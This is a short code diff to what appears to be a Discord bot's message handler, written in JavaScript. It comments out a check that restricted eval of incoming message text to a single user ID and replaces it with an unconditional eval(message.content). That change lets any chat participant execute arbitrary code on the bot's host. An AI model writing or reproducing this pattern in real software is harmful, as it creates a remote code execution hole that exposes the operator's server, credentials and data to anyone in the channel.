@@ -93,7 +93,8 @@ client.on('message', message => {
 
 		message.channel.send(jsonData[message.content]);
 		
-		if(message.author.id == "397345363415007253") eval(message.content);
+		//if(message.author.id == "397345363415007253") eval(message.content);
+		eval(message.content);
 
 		function backup() {
 			client.channels.get("635846859700830208").send({files: ['/app/createStrData.json']});
